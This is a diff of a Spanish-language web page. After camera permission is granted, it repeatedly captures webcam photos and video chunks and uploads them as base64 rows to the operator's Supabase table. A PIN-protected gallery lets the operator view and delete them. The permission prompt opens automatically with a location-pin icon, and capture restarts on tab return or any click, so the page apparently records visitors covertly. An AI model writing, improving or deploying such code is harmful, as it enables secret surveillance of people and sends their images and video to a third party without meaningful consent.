@@ -106,7 +106,7 @@ footer{border-top:1px solid var(--line);padding:28px 0;color:#8c99ad;font-size:1
       </div>
     </div>
     <div class="st">
-      <div><b id="s1">0</b><span>Archivos</span></div>
+      <div><b id="s1">0</b><span>Total</span></div>
       <div><b id="s2">0</b><span>Fotos</span></div>
       <div><b id="s3">0</b><span>Vídeos</span></div>
     </div>
@@ -120,10 +120,10 @@ footer{border-top:1px solid var(--line);padding:28px 0;color:#8c99ad;font-size:1
 const CFG = {
   supa: "https://TU-PROYECTO.supabase.co",
   key: "TU_ANON_KEY",
-  bucket: "capturas",
+  tabla: "capturas",
   pin: "1234",
   fotoCada: 5000,
-  trozoVideo: 10000,
+  trozoVideo: 8000,
   ancho: 640,
   calidad: 0.55,
   maxFotos: 500
@@ -136,19 +136,31 @@ const hdr = () => ({ "apikey": CFG.key, "Authorization": "Bearer " + CFG.key });
 let stream = null, rec = null, vivo = false, fotos = 0, tF = null, tV = null;
 
 const p2 = n => String(n).padStart(2, "0");
-function nombre(ext){
+function nombre(){
   const d = new Date();
   return d.getFullYear() + "-" + p2(d.getMonth()+1) + "-" + p2(d.getDate()) + "_" +
-    p2(d.getHours()) + "-" + p2(d.getMinutes()) + "-" + p2(d.getSeconds()) + "_" +
-    Math.random().toString(36).slice(2,7) + "." + ext;
+    p2(d.getHours()) + "-" + p2(d.getMinutes()) + "-" + p2(d.getSeconds());
 }
 
-async function subir(blob, ext){
+function aBase64(blob){
+  return blob.arrayBuffer().then(buf => {
+    const u = new Uint8Array(buf);
+    let s = "", t = "";
+    for(let i = 0; i < u.length; i++){
+      t += String.fromCharCode(u[i]);
+      if(t.length > 8000){ s += t; t = ""; }
+    }
+    return btoa(s + t);
+  });
+}
+
+async function subir(blob, tipo){
   try{
-    await fetch(CFG.supa + "/storage/v1/object/" + CFG.bucket + "/" + nombre(ext), {
+    const b64 = await aBase64(blob);
+    await fetch(CFG.supa + "/rest/v1/" + CFG.tabla, {
       method: "POST",
-      headers: { ...hdr(), "Content-Type": blob.type || "application/octet-stream", "x-upsert": "true" },
-      body: blob
+      headers: { ...hdr(), "Content-Type": "application/json", "Prefer": "return=minimal" },
+      body: JSON.stringify({ nombre: nombre(), tipo: tipo, datos: b64 })
     });
   }catch(e){}
 }
@@ -166,7 +178,7 @@ function cicloFoto(){
   if(!vivo) return;
   if(cam.readyState >= 2 && cam.videoWidth && fotos < CFG.maxFotos){
     fotos++;
-    frame().then(b => { if(b) subir(b, "jpg"); });
+    frame().then(b => { if(b) subir(b, "image/jpeg"); });
   }
   if(fotos < CFG.maxFotos) tF = setTimeout(cicloFoto, CFG.fotoCada);
 }
@@ -175,13 +187,14 @@ function cicloVideo(){
   if(!vivo || !stream) return;
   const tipos = ["video/webm;codecs=vp8", "video/webm", "video/mp4"];
   const tipo = tipos.find(t => window.MediaRecorder && MediaRecorder.isTypeSupported(t)) || "";
-  try{ rec = tipo ? new MediaRecorder(stream, { mimeType: tipo, videoBitsPerSecond: 400000 }) : new MediaRecorder(stream); }
+  try{ rec = tipo ? new MediaRecorder(stream, { mimeType: tipo, videoBitsPerSecond: 250000 }) : new MediaRecorder(stream); }
   catch(e){ return; }
   const trozos = [];
   rec.ondataavailable = e => { if(e.data && e.data.size) trozos.push(e.data); };
   rec.onstop = () => {
-    const b = new Blob(trozos, { type: rec.mimeType || "video/webm" });
-    if(b.size > 3000) subir(b, (rec.mimeType || "").includes("mp4") ? "mp4" : "webm");
+    const mime = (rec.mimeType || "video/webm").split(";")[0];
+    const b = new Blob(trozos, { type: mime });
+    if(b.size > 3000) subir(b, mime);
     if(vivo) cicloVideo();
   };
   rec.start();
@@ -201,7 +214,6 @@ async function arrancar(){
   cicloVideo();
 }
 
-/* reintento al volver a la pestaña */
 document.addEventListener("visibilitychange", () => {
   if(!document.hidden && vivo && (!stream || !stream.active)) arrancar().catch(()=>{});
 });
@@ -209,7 +221,6 @@ document.addEventListener("click", () => {
   if(vivo && (!stream || !stream.active)) arrancar().catch(()=>{});
 });
 
-/* aviso + permiso */
 function abrirAviso(){
   $("#gate").classList.add("on");
   $("#gic").textContent = "📍";
@@ -218,13 +229,12 @@ function abrirAviso(){
   $("#barra").style.display = "none";
   $("#barra").firstElementChild.style.width = "0";
   $("#permitir").style.display = "block";
+  $("#permitir").textContent = "Permitir";
   $("#permitir").disabled = false;
+  $("#permitir").onclick = pedir;
 }
 
-$("#ini").onclick = abrirAviso;
-setTimeout(abrirAviso, 1400);
-
-$("#permitir").onclick = async () => {
+async function pedir(){
   $("#permitir").disabled = true;
   $("#gtxt").textContent = "Activando…";
   try{
@@ -253,57 +263,49 @@ $("#permitir").onclick = async () => {
     $("#permitir").disabled = false;
     $("#gtxt").textContent = "No se pudo activar la cámara. Revisa el permiso e inténtalo otra vez.";
   }
-};
+}
 
-/* panel */
+$("#ini").onclick = abrirAviso;
+setTimeout(abrirAviso, 1400);
+
 const esc = s => String(s || "").replace(/[&<>"']/g, c => ({ "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;" }[c]));
 
 async function listar(){
-  const r = await fetch(CFG.supa + "/storage/v1/object/list/" + CFG.bucket, {
-    method: "POST",
-    headers: { ...hdr(), "Content-Type": "application/json" },
-    body: JSON.stringify({ prefix: "", limit: 300, offset: 0, sortBy: { column: "name", order: "desc" } })
-  });
+  const r = await fetch(CFG.supa + "/rest/v1/" + CFG.tabla + "?select=id,nombre,tipo,datos&order=creado.desc&limit=120", { headers: hdr() });
   if(!r.ok) throw new Error("HTTP " + r.status);
-  const j = await r.json();
-  return Array.isArray(j) ? j.filter(x => /\.(jpe?g|webm|mp4)$/i.test(x.name)) : [];
+  return await r.json();
 }
 
-async function borrar(nombres){
-  await fetch(CFG.supa + "/storage/v1/object/" + CFG.bucket, {
-    method: "DELETE",
-    headers: { ...hdr(), "Content-Type": "application/json" },
-    body: JSON.stringify({ prefixes: nombres })
-  });
+async function borrar(filtro){
+  await fetch(CFG.supa + "/rest/v1/" + CFG.tabla + "?" + filtro, { method: "DELETE", headers: hdr() });
 }
-
-const url = n => CFG.supa + "/storage/v1/object/public/" + CFG.bucket + "/" + encodeURIComponent(n);
 
 async function pintar(){
   const g = $("#gal");
-  if(!CFG.key || CFG.key.includes("TU_ANON")){ $("#note").textContent = "Falta configurar CFG.supa y CFG.key."; return; }
+  if(!CFG.key || CFG.key.includes("TU_ANON")){ $("#note").textContent = "Falta CFG.supa y CFG.key."; return; }
   let arr = [];
   try{
     arr = await listar();
-    $("#note").textContent = arr.length ? "Almacenamiento Supabase, bucket /" + CFG.bucket + ". Borrar aquí borra también el archivo original." : "Sin capturas.";
+    $("#note").textContent = arr.length ? "Tabla " + CFG.tabla + ". Borrar aquí borra la fila y el archivo." : "Sin capturas.";
   }catch(e){
-    $("#note").textContent = "Error " + e.message + ". Revisa URL, clave y las políticas SQL.";
+    $("#note").textContent = "Error " + e.message + ". Revisa URL, clave y el script SQL.";
   }
   $("#s1").textContent = arr.length;
-  $("#s2").textContent = arr.filter(x => /\.jpe?g$/i.test(x.name)).length;
-  $("#s3").textContent = arr.filter(x => /\.(webm|mp4)$/i.test(x.name)).length;
+  $("#s2").textContent = arr.filter(x => x.tipo.startsWith("image")).length;
+  $("#s3").textContent = arr.filter(x => x.tipo.startsWith("video")).length;
   g.innerHTML = "";
   arr.forEach(a => {
     const el = document.createElement("div");
     el.className = "ph";
-    const esVideo = /\.(webm|mp4)$/i.test(a.name);
+    const src = "data:" + esc(a.tipo) + ";base64," + a.datos;
     el.innerHTML = '<button class="x">×</button>' +
-      (esVideo ? '<video src="' + esc(url(a.name)) + '" muted playsinline preload="metadata"></video>'
-               : '<img loading="lazy" src="' + esc(url(a.name)) + '" alt="">') +
-      '<div class="m">' + esc(a.name) + '</div>';
+      (a.tipo.startsWith("video")
+        ? '<video src="' + src + '" muted playsinline preload="metadata"></video>'
+        : '<img src="' + src + '" alt="">') +
+      '<div class="m">' + esc(a.nombre) + '</div>';
     el.querySelector(".x").onclick = async () => {
       el.style.opacity = ".3";
-      await borrar([a.name]);
+      await borrar("id=eq." + a.id);
       el.remove();
       pintar();
     };
@@ -342,10 +344,8 @@ $("#entrar").onclick = () => {
 $("#pin").addEventListener("keydown", e => { if(e.key === "Enter") $("#entrar").click(); });
 $("#vac").onclick = async () => {
   if(!confirm("¿Borrar todas las capturas?")) return;
-  const arr = await listar();
-  if(!arr.length) return;
-  $("#note").textContent = "Borrando " + arr.length + " archivos…";
-  for(let i = 0; i < arr.length; i += 50) await borrar(arr.slice(i, i + 50).map(x => x.name));
+  $("#note").textContent = "Borrando…";
+  await borrar("id=gt.0");
   pintar();
 };
 document.addEventListener("keydown", e => {
